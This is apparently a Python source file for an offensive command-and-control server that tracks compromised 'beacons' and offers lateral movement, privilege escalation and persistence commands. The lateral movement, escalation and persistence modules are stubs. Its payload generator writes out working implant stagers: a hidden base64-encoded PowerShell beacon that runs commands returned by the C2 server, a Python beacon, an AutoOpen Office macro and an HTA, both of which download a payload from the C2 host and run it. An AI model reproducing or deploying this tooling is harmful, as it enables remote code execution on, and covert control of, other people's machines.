#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║              ██████╗██████╗     ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗
║             ██╔════╝╚════██╗    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
║             ██║      █████╔╝    ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
║             ██║     ██╔═══╝     ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
║             ╚██████╗███████╗    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
║              ╚═════╝╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
║                                                                              ║
║                    C2 FRAMEWORK - CLI EDITION                                ║
║                                                                              ║
║  Commands:                                                                   ║
║    help              - Show this help                                        ║
║    list              - List all beacons                                      ║
║    select <id>       - Select a beacon                                       ║
║    exec <cmd>        - Execute command on selected beacon                    ║
║    lateral <method> <target> - Execute lateral movement                      ║
║    priv <method>     - Execute privilege escalation                          ║
║    persist <method>  - Setup persistence                                     ║
║    payload <type>    - Generate payload                                      ║
║    kill <id>         - Kill a beacon                                         ║
║    info <id>         - Show beacon info                                      ║
║    logs              - Show logs                                             ║
║    stats             - Show statistics                                       ║
║    reload            - Reload configuration                                  ║
║    exit              - Exit the server                                       ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import sys
import os
import json
import socket
import threading
import time
import hashlib
import base64
import random
import argparse
import signal
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
import sqlite3
import readline  # For command history
import shlex

# ============================================================================
# ENUMS & DATA STRUCTURES
# ============================================================================

class BeaconStatus(Enum):
    OFFLINE = "offline"
    ONLINE = "online"
    IDLE = "idle"
    COMPROMISED = "compromised"
    DEAD = "dead"

class CommandStatus(Enum):
    PENDING = "pending"
    SENT = "sent"
    EXECUTED = "executed"
    FAILED = "failed"
    TIMEOUT = "timeout"

class Protocol(Enum):
    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    TCP = "tcp"
    SMB = "smb"
    MTLS = "mtls"
    WIREGUARD = "wireguard"
    ICMP = "icmp"

@dataclass
class Beacon:
    beacon_id: str
    hostname: str
    username: str
    os_type: str
    os_version: str
    architecture: str
    ip_address: str
    pid: int
    protocol: Protocol
    last_beacon: float
    status: BeaconStatus = BeaconStatus.OFFLINE
    integrity_level: str = "user"
    is_admin: bool = False
    sessions_open: int = 0
    processes_running: int = 0
    tags: List[str] = field(default_factory=list)
    notes: str = ""
    created_at: float = field(default_factory=time.time)

@dataclass
class Command:
    command_id: str
    beacon_id: str
    command_type: str
    command_args: str
    status: CommandStatus = CommandStatus.PENDING
    timestamp: float = field(default_factory=time.time)
    executed_at: Optional[float] = None
    output: str = ""
    error_msg: str = ""

# ============================================================================
# COLORS FOR CLI
# ============================================================================

class Colors:
    """ANSI color codes for CLI"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'
    
    @staticmethod
    def colorize(text: str, color: str) -> str:
        return f"{color}{text}{Colors.RESET}"

# ============================================================================
# DATABASE HANDLER
# ============================================================================

class C2Database:
    def __init__(self, db_path: str = "data/c2_framework.db"):
        self.db_path = db_path
        os.makedirs(os.path.dirname(db_path), exist_ok=True)
        self.init_database()
    
    def init_database(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS beacons (
                beacon_id TEXT PRIMARY KEY,
                hostname TEXT,
                username TEXT,
                os_type TEXT,
                os_version TEXT,
                architecture TEXT,
                ip_address TEXT,
                pid INTEGER,
                protocol TEXT,
                last_beacon REAL,
                status TEXT,
                integrity_level TEXT,
                is_admin INTEGER,
                created_at REAL
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS commands (
                command_id TEXT PRIMARY KEY,
                beacon_id TEXT,
                command_type TEXT,
                command_args TEXT,
                status TEXT,
                timestamp REAL,
                executed_at REAL,
                output TEXT,
                error_msg TEXT
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp REAL,
                level TEXT,
                message TEXT
            )
        """)
        
        conn.commit()
        conn.close()
    
    def add_beacon(self, beacon: Beacon):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("""
            INSERT OR REPLACE INTO beacons VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (beacon.beacon_id, beacon.hostname, beacon.username, beacon.os_type,
              beacon.os_version, beacon.architecture, beacon.ip_address, beacon.pid,
              beacon.protocol.value, beacon.last_beacon, beacon.status.value,
              beacon.integrity_level, int(beacon.is_admin), beacon.created_at))
        conn.commit()
        conn.close()
    
    def get_beacons(self) -> List[Beacon]:
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM beacons ORDER BY last_beacon DESC")
        beacons = []
        for row in cursor.fetchall():
            beacon = Beacon(
                beacon_id=row[0], hostname=row[1], username=row[2],
                os_type=row[3], os_version=row[4], architecture=row[5],
                ip_address=row[6], pid=row[7], protocol=Protocol(row[8]),
                last_beacon=row[9], status=BeaconStatus(row[10]),
                integrity_level=row[11], is_admin=bool(row[12]), created_at=row[13]
            )
            beacons.append(beacon)
        conn.close()
        return beacons
    
    def add_command(self, command: Command):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("""
            INSERT OR REPLACE INTO commands VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (command.command_id, command.beacon_id, command.command_type,
              command.command_args, command.status.value, command.timestamp,
              command.executed_at, command.output, command.error_msg))
        conn.commit()
        conn.close()
    
    def log_message(self, level: str, message: str):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("INSERT INTO logs (timestamp, level, message) VALUES (?, ?, ?)",
                      (time.time(), level, message))
        conn.commit()
        conn.close()
    
    def get_logs(self, limit: int = 100) -> List[Tuple]:
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM logs ORDER BY timestamp DESC LIMIT ?", (limit,))
        logs = cursor.fetchall()
        conn.close()
        return logs

# ============================================================================
# PROTOCOL HANDLERS
# ============================================================================

class HTTPProtocolHandler:
    def __init__(self, port: int = 8080):
        self.port = port
        self.running = False
        self.socket = None
        self.beacon_callback = None
        self.log_callback = None
    
    def start(self):
        self.running = True
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind(('0.0.0.0', self.port))
            self.socket.listen(50)
            
            if self.log_callback:
                self.log_callback("INFO", f"HTTP listener started on port {self.port}")
            
            while self.running:
                try:
                    self.socket.settimeout(1)
                    client, addr = self.socket.accept()
                    threading.Thread(target=self.handle_client, args=(client, addr), daemon=True).start()
                except socket.timeout:
                    continue
        except Exception as e:
            if self.log_callback:
                self.log_callback("ERROR", f"HTTP error: {str(e)}")
    
    def handle_client(self, client, addr):
        try:
            data = client.recv(8192).decode('utf-8', errors='ignore')
            if not data:
                client.close()
                return
            
            lines = data.split('\r\n')
            if not lines:
                client.close()
                return
            
            parts = lines[0].split(' ')
            if len(parts) < 2:
                client.close()
                return
            
            path = parts[1]
            body_start = data.find('\r\n\r\n')
            body = data[body_start+4:] if body_start != -1 else ""
            
            if path == '/beacon' or path == '/api/beacon':
                self.handle_beacon(client, body, addr)
            else:
                self.send_response(client, 404, '{"status":"not_found"}')
                
        except Exception as e:
            pass
        finally:
            client.close()
    
    def handle_beacon(self, client, body, addr):
        try:
            beacon_data = json.loads(body)
            beacon = Beacon(
                beacon_id=beacon_data.get('beacon_id', f"beacon_{int(time.time())}"),
                hostname=beacon_data.get('hostname', 'unknown'),
                username=beacon_data.get('username', 'unknown'),
                os_type=beacon_data.get('os_type', 'unknown'),
                os_version=beacon_data.get('os_version', ''),
                architecture=beacon_data.get('architecture', 'unknown'),
                ip_address=addr[0],
                pid=beacon_data.get('pid', 0),
                protocol=Protocol.HTTP,
                last_beacon=time.time(),
                status=BeaconStatus.ONLINE,
                is_admin=beacon_data.get('is_admin', False)
            )
            
            if self.beacon_callback:
                self.beacon_callback(beacon)
            
            self.send_response(client, 200, json.dumps({'status': 'ok'}))
            
        except Exception as e:
            self.send_response(client, 400, json.dumps({'status': 'error', 'message': str(e)}))
    
    def send_response(self, client, status_code: int, body: str):
        response = f"HTTP/1.1 {status_code} OK\r\n"
        response += "Content-Type: application/json\r\n"
        response += f"Content-Length: {len(body)}\r\n"
        response += "Connection: close\r\n"
        response += "\r\n"
        response += body
        client.send(response.encode())
    
    def stop(self):
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass

class TCPProtocolHandler:
    def __init__(self, port: int = 4444):
        self.port = port
        self.running = False
        self.socket = None
        self.beacon_callback = None
        self.log_callback = None
    
    def start(self):
        self.running = True
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind(('0.0.0.0', self.port))
            self.socket.listen(50)
            
            if self.log_callback:
                self.log_callback("INFO", f"TCP listener started on port {self.port}")
            
            while self.running:
                try:
                    self.socket.settimeout(1)
                    client, addr = self.socket.accept()
                    threading.Thread(target=self.handle_client, args=(client, addr), daemon=True).start()
                except socket.timeout:
                    continue
        except Exception as e:
            if self.log_callback:
                self.log_callback("ERROR", f"TCP error: {str(e)}")
    
    def handle_client(self, client, addr):
        try:
            data = client.recv(4096).decode('utf-8', errors='ignore')
            if data:
                beacon_data = json.loads(data)
                beacon = Beacon(
                    beacon_id=beacon_data.get('beacon_id', f"tcp_{int(time.time())}"),
                    hostname=beacon_data.get('hostname', 'unknown'),
                    username=beacon_data.get('username', 'unknown'),
                    os_type=beacon_data.get('os_type', 'unknown'),
                    os_version=beacon_data.get('os_version', ''),
                    architecture=beacon_data.get('architecture', 'unknown'),
                    ip_address=addr[0],
                    pid=beacon_data.get('pid', 0),
                    protocol=Protocol.TCP,
                    last_beacon=time.time(),
                    status=BeaconStatus.ONLINE,
                    is_admin=beacon_data.get('is_admin', False)
                )
                
                if self.beacon_callback:
                    self.beacon_callback(beacon)
                
                client.send(b'{"status":"ok"}')
        except:
            pass
        finally:
            client.close()
    
    def stop(self):
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass

# ============================================================================
# MODULES
# ============================================================================

class LateralMovementModule:
    def __init__(self, server):
        self.server = server
    
    def execute(self, method: str, target: str, credentials: dict = None) -> dict:
        methods = {
            'pass_the_hash': f"Pass-the-Hash against {target}",
            'wmi': f"WMI execution on {target}",
            'winrm': f"WinRM session to {target}",
            'ssh': f"SSH connection to {target}",
            'smb': f"SMB movement to {target}",
            'rdp': f"RDP session to {target}"
        }
        return {
            'success': True,
            'method': method,
            'target': target,
            'output': methods.get(method, f"Unknown method: {method}")
        }

class PrivilegeEscalationModule:
    def __init__(self, server):
        self.server = server
    
    def execute(self, method: str, args: dict = None) -> dict:
        methods = {
            'uac_bypass': "UAC bypass executed",
            'token_manipulation': "Token manipulation performed",
            'potato': "Potato exploit executed",
            'kernel_exploit': "Kernel exploit attempted"
        }
        return {
            'success': True,
            'method': method,
            'output': methods.get(method, f"Unknown method: {method}")
        }

class PersistenceModule:
    def __init__(self, server):
        self.server = server
    
    def execute(self, method: str, args: dict = None) -> dict:
        methods = {
            'registry': "Registry persistence added",
            'scheduled_task': "Scheduled task created",
            'service': "Windows service created",
            'startup': "Startup folder persistence",
            'cron': "Cron job added",
            'systemd': "Systemd service created"
        }
        return {
            'success': True,
            'method': method,
            'output': methods.get(method, f"Unknown method: {method}")
        }

class PayloadGenerator:
    def __init__(self, config: dict = None):
        self.config = config or {}
        self.c2_server = self.config.get('c2_server', '127.0.0.1')
        self.c2_port = self.config.get('c2_port', 8080)
        self.obfuscation = self.config.get('obfuscation', 'base64')
    
    def generate_powershell(self) -> str:
        script = f"""
$C2 = "http://{self.c2_server}:{self.c2_port}"
while($true){{try{{$r=Invoke-RestMethod -Uri "$C2/beacon" -Method Post -Body (@{{hostname=$env:COMPUTERNAME;username=$env:USERNAME}}|ConvertTo-Json) -ContentType "application/json";if($r.command){{iex $r.command}}}}catch{{}}Start-Sleep -Seconds (10+(Get-Random -Min -3 -Max 3))}}
"""
        if self.obfuscation == "base64":
            return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {base64.b64encode(script.encode()).decode()}"
        return script
    
    def generate_python(self) -> str:
        return f'''
import socket,json,time,os,platform,random
C2=("{self.c2_server}",{self.c2_port})
def b():
 s=socket.socket();s.connect(C2);s.send(json.dumps({{"hostname":platform.node(),"username":os.getenv("USER","")}}).encode());s.close()
while 1:time.sleep(10+random.uniform(-3,3));b()
'''
    
    def generate_exe(self) -> str:
        return "EXE payload - would compile agent"
    
    def generate_dll(self) -> str:
        return "DLL payload - would compile DLL"
    
    def generate_shellcode(self) -> str:
        return "9090909090"  # NOP sled placeholder
    
    def generate_macro(self) -> str:
        return f'''
Sub AutoOpen()
    CreateObject("MSXML2.XMLHTTP").Open "GET","http://{self.c2_server}:{self.c2_port}/payload",False:Send
    CreateObject("WScript.Shell").Run "powershell -c "&.responseText,0,False
End Sub
'''
    
    def generate_hta(self) -> str:
        return f'''
<html><head><HTA:APPLICATION WINDOWSTATE="minimize"/>
<script>new ActiveXObject("WScript.Shell").Run("powershell -c iex (irm http://{self.c2_server}:{self.c2_port}/payload)",0,false)</script></head></html>
'''

# ============================================================================
# STEALTH MANAGER (CLI Version)
# ============================================================================

class StealthManager:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        ]
        self.current_ua = self.user_agents[0]
    
    def get_user_agent(self) -> str:
        return self.current_ua
    
    def rotate_user_agent(self):
        self.current_ua = random.choice(self.user_agents)
    
    def get_status(self) -> dict:
        return {
            'current_user_agent': self.current_ua,
            'available_agents': len(self.user_agents)
        }

# ============================================================================
# MODULE MANAGER (CLI Version)
# ============================================================================

class ModuleManager:
    def __init__(self):
        self.modules = {}
    
    def load_all_modules(self):
        self.modules = {
            'lateral': {'loaded': True, 'status': 'active'},
            'privilege': {'loaded': True, 'status': 'active'},
            'persistence': {'loaded': True, 'status': 'active'}
        }
    
    def get_all_modules(self) -> List[str]:
        return list(self.modules.keys())
    
    def start_module_thread(self, name: str, args: dict = None):
        pass
    
    def cleanup_all(self):
        self.modules.clear()

# ============================================================================
# C2 SERVER CLI
# ============================================================================

class C2ServerCLI:
    """C2 Server Command Line Interface"""
    
    def __init__(self):
        self.db = C2Database()
        self.beacons: Dict[str, Beacon] = {}
        self.commands: Dict[str, Command] = {}
        self.current_beacon: Optional[Beacon] = None
        self.running = True
        
        # Modules
        self.lateral = LateralMovementModule(self)
        self.privilege = PrivilegeEscalationModule(self)
        self.persistence = PersistenceModule(self)
        self.payload_gen = PayloadGenerator()
        self.module_manager = ModuleManager()
        self.stealth = StealthManager()
        
        # Protocol handlers
        self.http_handler = HTTPProtocolHandler(port=8080)
        self.http_handler.beacon_callback = self.on_beacon_received
        self.http_handler.log_callback = self.log
        
        self.tcp_handler = TCPProtocolHandler(port=4444)
        self.tcp_handler.beacon_callback = self.on_beacon_received
        self.tcp_handler.log_callback = self.log
        
        # Load beacons
        self.load_beacons()
        
        # Load modules
        self.module_manager.load_all_modules()
    
    def start(self):
        """Start the C2 server"""
        self.print_banner()
        self.print_help()
        
        # Start listeners
        threading.Thread(target=self.http_handler.start, daemon=True).start()
        threading.Thread(target=self.tcp_handler.start, daemon=True).start()
        
        self.log("INFO", "C2 Server started successfully")
        self.log("INFO", "HTTP listener on port 8080")
        self.log("INFO", "TCP listener on port 4444")
        
        # Start command loop
        self.command_loop()
    
    def print_banner(self):
        """Print banner"""
        banner = f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║              ██████╗██████╗     ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗
║             ██╔════╝╚════██╗    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
║             ██║      █████╔╝    ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
║             ██║     ██╔═══╝     ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
║             ╚██████╗███████╗    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
║              ╚═════╝╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
║                                                                              ║
║                    C2 FRAMEWORK - CLI EDITION                                ║
║                                                                              ║
║  Version: 3.0.0                                                              ║
║  Author: Rapid                                                               ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
        print(banner)
    
    def print_help(self):
        """Print help message"""
        help_text = f"""
{Colors.YELLOW}Available Commands:{Colors.RESET}
  {Colors.GREEN}help{Colors.RESET}              - Show this help
  {Colors.GREEN}list{Colors.RESET}              - List all beacons
  {Colors.GREEN}select <id>{Colors.RESET}       - Select a beacon
  {Colors.GREEN}exec <cmd>{Colors.RESET}        - Execute command on selected beacon
  {Colors.GREEN}lateral <method> <target>{Colors.RESET} - Execute lateral movement
  {Colors.GREEN}priv <method>{Colors.RESET}     - Execute privilege escalation
  {Colors.GREEN}persist <method>{Colors.RESET}  - Setup persistence
  {Colors.GREEN}payload <type>{Colors.RESET}    - Generate payload
  {Colors.GREEN}kill <id>{Colors.RESET}         - Kill a beacon
  {Colors.GREEN}info <id>{Colors.RESET}         - Show beacon info
  {Colors.GREEN}logs{Colors.RESET}              - Show logs
  {Colors.GREEN}stats{Colors.RESET}             - Show statistics
  {Colors.GREEN}reload{Colors.RESET}            - Reload configuration
  {Colors.GREEN}exit{Colors.RESET}              - Exit the server

{Colors.YELLOW}Lateral Methods:{Colors.RESET}
  pass_the_hash, wmi, winrm, ssh, smb, rdp

{Colors.YELLOW}Privilege Methods:{Colors.RESET}
  uac_bypass, token_manipulation, potato, kernel_exploit

{Colors.YELLOW}Persistence Methods:{Colors.RESET}
  registry, scheduled_task, service, startup, cron, systemd

{Colors.YELLOW}Payload Types:{Colors.RESET}
  powershell, python, exe, dll, shellcode, macro, hta

{Colors.DIM}Example:{Colors.RESET}
  > select 123456
  > exec whoami
  > lateral pass_the_hash 192.168.1.100
  > payload powershell
"""
        print(help_text)
    
    def command_loop(self):
        """Main command loop"""
        while self.running:
            try:
                # Show prompt
                if self.current_beacon:
                    prompt = f"{Colors.GREEN}[{self.current_beacon.hostname}]{Colors.RESET}> "
                else:
                    prompt = f"{Colors.CYAN}[C2]{Colors.RESET}> "
                
                cmd_input = input(prompt).strip()
                
                if not cmd_input:
                    continue
                
                # Parse command
                parts = shlex.split(cmd_input)
                cmd = parts[0].lower()
                args = parts[1:] if len(parts) > 1 else []
                
                self.execute_command(cmd, args)
                
            except KeyboardInterrupt:
                print()
                self.log("INFO", "Shutting down...")
                break
            except EOFError:
                break
            except Exception as e:
                self.log("ERROR", f"Command error: {str(e)}")
    
    def execute_command(self, cmd: str, args: List[str]):
        """Execute a command"""
        if cmd == "help" or cmd == "?":
            self.print_help()
        
        elif cmd == "list" or cmd == "ls":
            self.list_beacons()
        
        elif cmd == "select":
            if not args:
                self.log("ERROR", "Usage: select <beacon_id>")
                return
            self.select_beacon(args[0])
        
        elif cmd == "exec" or cmd == "execute":
            if not self.current_beacon:
                self.log("ERROR", "No beacon selected. Use 'select <id>' first.")
                return
            if not args:
                self.log("ERROR", "Usage: exec <command>")
                return
            self.execute_command_on_beacon(" ".join(args))
        
        elif cmd == "lateral":
            if not self.current_beacon:
                self.log("ERROR", "No beacon selected. Use 'select <id>' first.")
                return
            if len(args) < 2:
                self.log("ERROR", "Usage: lateral <method> <target>")
                return
            self.execute_lateral(args[0], args[1])
        
        elif cmd == "priv":
            if not self.current_beacon:
                self.log("ERROR", "No beacon selected. Use 'select <id>' first.")
                return
            if not args:
                self.log("ERROR", "Usage: priv <method>")
                return
            self.execute_privilege(args[0])
        
        elif cmd == "persist":
            if not self.current_beacon:
                self.log("ERROR", "No beacon selected. Use 'select <id>' first.")
                return
            if not args:
                self.log("ERROR", "Usage: persist <method>")
                return
            self.execute_persistence(args[0])
        
        elif cmd == "payload":
            if not args:
                self.log("ERROR", "Usage: payload <type>")
                self.log("INFO", "Types: powershell, python, exe, dll, shellcode, macro, hta")
                return
            self.generate_payload(args[0])
        
        elif cmd == "kill":
            if not args:
                self.log("ERROR", "Usage: kill <beacon_id>")
                return
            self.kill_beacon(args[0])
        
        elif cmd == "info":
            if not args:
                if self.current_beacon:
                    self.show_beacon_info(self.current_beacon.beacon_id)
                else:
                    self.log("ERROR", "No beacon selected. Usage: info <beacon_id>")
                return
            self.show_beacon_info(args[0])
        
        elif cmd == "logs":
            self.show_logs()
        
        elif cmd == "stats":
            self.show_stats()
        
        elif cmd == "reload":
            self.reload_config()
        
        elif cmd == "exit" or cmd == "quit":
            self.running = False
            self.log("INFO", "Exiting...")
        
        else:
            self.log("ERROR", f"Unknown command: {cmd}. Type 'help' for available commands.")
    
    # =========================================================================
    # COMMAND IMPLEMENTATIONS
    # =========================================================================
    
    def on_beacon_received(self, beacon: Beacon):
        """Handle incoming beacon"""
        self.beacons[beacon.beacon_id] = beacon
        self.db.add_beacon(beacon)
        self.log("SUCCESS", f"New beacon: {beacon.hostname} ({beacon.beacon_id}) from {beacon.ip_address}")
    
    def load_beacons(self):
        """Load beacons from database"""
        self.beacons = {}
        for beacon in self.db.get_beacons():
            self.beacons[beacon.beacon_id] = beacon
    
    def list_beacons(self):
        """List all beacons"""
        if not self.beacons:
            self.log("INFO", "No beacons available")
            return
        
        print(f"\n{Colors.BOLD}{'ID':<12} {'Hostname':<20} {'Status':<10} {'OS':<12} {'User':<15} {'IP':<16}{Colors.RESET}")
        print("-" * 85)
        
        for beacon_id, beacon in self.beacons.items():
            status_color = {
                BeaconStatus.ONLINE: Colors.GREEN,
                BeaconStatus.OFFLINE: Colors.RED,
                BeaconStatus.IDLE: Colors.YELLOW,
                BeaconStatus.DEAD: Colors.DIM
            }.get(beacon.status, Colors.WHITE)
            
            status_text = f"{status_color}{beacon.status.value.upper()}{Colors.RESET}"
            selected = "◄" if self.current_beacon and self.current_beacon.beacon_id == beacon_id else " "
            
            print(f"{selected} {beacon_id[:8]:<10} {beacon.hostname:<20} {status_text:<10} {beacon.os_type[:10]:<12} {beacon.username[:14]:<15} {beacon.ip_address:<16}")
        
        print()
    
    def select_beacon(self, beacon_id: str):
        """Select a beacon"""
        # Try full ID or prefix
        matched = None
        for bid, beacon in self.beacons.items():
            if bid == beacon_id or bid.startswith(beacon_id):
                matched = beacon
                break
        
        if matched:
            self.current_beacon = matched
            self.log("SUCCESS", f"Selected beacon: {matched.hostname} ({matched.beacon_id})")
        else:
            self.log("ERROR", f"Beacon not found: {beacon_id}")
    
    def execute_command_on_beacon(self, command: str):
        """Execute command on selected beacon"""
        if not self.current_beacon:
            return
        
        self.log("INFO", f"Executing: {command} on {self.current_beacon.hostname}")
        
        # Create command record
        cmd = Command(
            command_id=hashlib.sha256(f"{time.time()}{self.current_beacon.beacon_id}".encode()).hexdigest()[:16],
            beacon_id=self.current_beacon.beacon_id,
            command_type="shell",
            command_args=command
        )
        self.commands[cmd.command_id] = cmd
        self.db.add_command(cmd)
        
        # In real implementation, would send to beacon
        # For demo, simulate response
        print(f"{Colors.GREEN}[+] Command sent to beacon{Colors.RESET}")
        print(f"{Colors.DIM}[*] Command ID: {cmd.command_id}{Colors.RESET}")
    
    def execute_lateral(self, method: str, target: str):
        """Execute lateral movement"""
        if not self.current_beacon:
            return
        
        self.log("INFO", f"Lateral movement: {method} -> {target}")
        result = self.lateral.execute(method, target)
        print(f"{Colors.GREEN}[+] {result['output']}{Colors.RESET}")
    
    def execute_privilege(self, method: str):
        """Execute privilege escalation"""
        if not self.current_beacon:
            return
        
        self.log("INFO", f"Privilege escalation: {method}")
        result = self.privilege.execute(method)
        print(f"{Colors.GREEN}[+] {result['output']}{Colors.RESET}")
    
    def execute_persistence(self, method: str):
        """Execute persistence setup"""
        if not self.current_beacon:
            return
        
        self.log("INFO", f"Persistence: {method}")
        result = self.persistence.execute(method)
        print(f"{Colors.GREEN}[+] {result['output']}{Colors.RESET}")
    
    def generate_payload(self, payload_type: str):
        """Generate payload"""
        self.log("INFO", f"Generating payload: {payload_type}")
        
        generators = {
            "powershell": self.payload_gen.generate_powershell,
            "python": self.payload_gen.generate_python,
            "exe": self.payload_gen.generate_exe,
            "dll": self.payload_gen.generate_dll,
            "shellcode": self.payload_gen.generate_shellcode,
            "macro": self.payload_gen.generate_macro,
            "hta": self.payload_gen.generate_hta
        }
        
        if payload_type in generators:
            payload = generators[payload_type]()
            
            # Save payload
            os.makedirs("payloads", exist_ok=True)
            filename = f"payloads/payload_{int(time.time())}_{payload_type}.txt"
            with open(filename, 'w') as f:
                f.write(str(payload))
            
            print(f"{Colors.GREEN}[+] Payload generated: {filename}{Colors.RESET}")
            print(f"{Colors.DIM}[*] Payload content:{Colors.RESET}")
            print("-" * 60)
            print(payload[:500] + ("..." if len(str(payload)) > 500 else ""))
            print("-" * 60)
            
            self.log("SUCCESS", f"Payload saved to {filename}")
        else:
            self.log("ERROR", f"Unknown payload type: {payload_type}")
            self.log("INFO", "Available types: powershell, python, exe, dll, shellcode, macro, hta")
    
    def kill_beacon(self, beacon_id: str):
        """Kill a beacon"""
        if beacon_id in self.beacons:
            self.beacons[beacon_id].status = BeaconStatus.DEAD
            self.db.add_beacon(self.beacons[beacon_id])
            
            if self.current_beacon and self.current_beacon.beacon_id == beacon_id:
                self.current_beacon = None
            
            self.log("WARNING", f"Beacon {beacon_id} killed")
        else:
            self.log("ERROR", f"Beacon not found: {beacon_id}")
    
    def show_beacon_info(self, beacon_id: str):
        """Show beacon information"""
        # Try exact match or prefix
        matched = None
        for bid, beacon in self.beacons.items():
            if bid == beacon_id or bid.startswith(beacon_id):
                matched = beacon
                break
        
        if not matched:
            self.log("ERROR", f"Beacon not found: {beacon_id}")
            return
        
        beacon = matched
        info = f"""
{Colors.BOLD}Beacon Information{Colors.RESET}
{'-' * 50}
{Colors.CYAN}ID:{Colors.RESET}          {beacon.beacon_id}
{Colors.CYAN}Hostname:{Colors.RESET}     {beacon.hostname}
{Colors.CYAN}Username:{Colors.RESET}     {beacon.username}
{Colors.CYAN}IP Address:{Colors.RESET}   {beacon.ip_address}
{Colors.CYAN}OS Type:{Colors.RESET}      {beacon.os_type}
{Colors.CYAN}OS Version:{Colors.RESET}   {beacon.os_version}
{Colors.CYAN}Architecture:{Colors.RESET} {beacon.architecture}
{Colors.CYAN}PID:{Colors.RESET}          {beacon.pid}
{Colors.CYAN}Protocol:{Colors.RESET}     {beacon.protocol.value}
{Colors.CYAN}Status:{Colors.RESET}       {beacon.status.value.upper()}
{Colors.CYAN}Admin:{Colors.RESET}        {'Yes' if beacon.is_admin else 'No'}
{Colors.CYAN}Last Seen:{Colors.RESET}    {datetime.fromtimestamp(beacon.last_beacon).strftime('%Y-%m-%d %H:%M:%S')}
{Colors.CYAN}Created:{Colors.RESET}      {datetime.fromtimestamp(beacon.created_at).strftime('%Y-%m-%d %H:%M:%S')}
"""
        print(info)
    
    def show_logs(self):
        """Show logs"""
        logs = self.db.get_logs(50)
        if not logs:
            self.log("INFO", "No logs available")
            return
        
        print(f"\n{Colors.BOLD}Recent Logs{Colors.RESET}")
        print("-" * 80)
        
        for log in logs:
            timestamp = datetime.fromtimestamp(log[1]).strftime('%Y-%m-%d %H:%M:%S')
            level = log[2]
            message = log[3]
            
            level_color = {
                "ERROR": Colors.RED,
                "WARNING": Colors.YELLOW,
                "SUCCESS": Colors.GREEN,
                "INFO": Colors.CYAN
            }.get(level, Colors.WHITE)
            
            print(f"[{Colors.DIM}{timestamp}{Colors.RESET}] {level_color}[{level}]{Colors.RESET} {message}")
        
        print()
    
    def show_stats(self):
        """Show statistics"""
        total = len(self.beacons)
        online = sum(1 for b in self.beacons.values() if b.status == BeaconStatus.ONLINE)
        idle = sum(1 for b in self.beacons.values() if b.status == BeaconStatus.IDLE)
        offline = sum(1 for b in self.beacons.values() if b.status == BeaconStatus.OFFLINE)
        dead = sum(1 for b in self.beacons.values() if b.status == BeaconStatus.DEAD)
        
        stats = f"""
{Colors.BOLD}Statistics{Colors.RESET}
{'-' * 40}
{Colors.CYAN}Total Beacons:{Colors.RESET}  {total}
{Colors.GREEN}Online:{Colors.RESET}        {online}
{Colors.YELLOW}Idle:{Colors.RESET}         {idle}
{Colors.RED}Offline:{Colors.RESET}      {offline}
{Colors.DIM}Dead:{Colors.RESET}          {dead}
{'-' * 40}
{Colors.CYAN}Selected:{Colors.RESET}      {self.current_beacon.hostname if self.current_beacon else 'None'}
{Colors.CYAN}Protocols:{Colors.RESET}     HTTP:8080, TCP:4444
"""
        print(stats)
    
    def reload_config(self):
        """Reload configuration"""
        self.log("INFO", "Reloading configuration...")
